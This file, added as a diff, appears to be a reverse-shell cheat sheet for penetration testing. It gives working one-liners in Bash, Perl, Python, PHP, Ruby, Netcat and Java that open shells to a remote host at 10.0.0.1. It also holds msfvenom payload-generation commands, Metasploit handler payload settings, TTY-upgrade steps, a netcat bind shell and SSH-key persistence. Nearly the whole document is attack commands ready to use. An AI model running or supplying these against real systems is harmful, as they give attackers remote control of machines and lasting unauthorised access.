@@ -1,0 +1,128 @@
+----------------------------------------------------------------------------------------------------------------------------
+Bash
+
+
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+-------------------------------------------------------------------------------------------------------------------------
+PERL
+
+
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
+open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+---------------------------------------------------------------------------------------------------------------------------
+PYTHON
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
+-----------------------------------------------------------------------------------------------------------------------
+PHP
+
+
+php -r '$sock=fsockopen("10.0.0.1",1234);
+exec("/bin/sh -i <&3 >&3 2>&3");'
+------------------------------------------------------------------------------------------------------------------------
+RUBY
+
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;
+exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+------------------------------------------------------------------------------------------------------------------------
+Netcat
+
+nc -e /bin/sh 10.0.0.1 1234
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+------------------------------------------------------------------------------------------------------------------------
+Java
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;
+cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+---------------------------------------------------------------------------------------------------------------------------
+xterm 
+
+xterm -display 10.0.0.1:1
+xhost +targetip
+
+---------------------------------------------------------------------------------------------------------------------------
+msfvenom basic cheat sheet 
+
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f elf > shell.elf
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f exe > meterpreter.exe
+msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=1234 -f raw > shell.php
+msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.1 LPORT=1234 -f raw > shell.py
+msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=1234 -f raw > shell.sh
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f war > shell.war
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f asp > shell.asp
+-------------------------------------------------------------------------------------------------------------------------
+
+use exploit/multi/handler
+
+# Windows Payloads
+set payload windows/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_https
+set payload windows/meterpreter/reverse_http
+set payload windows/shell/reverse_tcp
+set payload windows/meterpreter/bind_tcp
+set payload windows/shell_reverse_tcp
+
+# Linux Payloads
+set payload linux/x86/meterpreter/reverse_tcp
+set payload linux/x86/shell_reverse_tcp
+set payload linux/x86/shell_bind_tcp
+set payload linux/x64/meterpreter/reverse_tcp
+set payload linux/x64/shell_reverse_tcp
+
+# macOS Payloads
+set payload osx/x86/meterpreter/reverse_tcp
+set payload osx/x86/shell_reverse_tcp
+set payload osx/x86/shell_bind_tcp
+
+# Android Payloads
+set payload android/meterpreter/reverse_tcp
+set payload android/meterpreter/reverse_https
+
+# PHP Payloads
+set payload php/meterpreter/reverse_tcp
+
+# Java Payloads
+set payload java/meterpreter/reverse_tcp
+
+# Python Payloads
+set payload python/meterpreter/reverse_tcp
+
+# ASP Payloads (for IIS)
+set payload windows/meterpreter/reverse_tcp
+
+---------------------------------------------------------------------------------------------------------------------------
+Upgrading a Reverse Shell to Fully Interactive TTY
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <num> columns <num>
+----------------------------------------------------------------------------------------------------------------------------
+Bind Shell (Netcat)
+
+nc -lvnp 1234 -e /bin/bash
+-----------------------------------------------------------------------------------------------------------------------------
+SSH Key Persistence
+
+mkdir -p ~/.ssh
+echo "your-ssh-public-key" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+python3 -m http.server 8080
+
+---------------------------------------------------------------------------------------------------------------------------
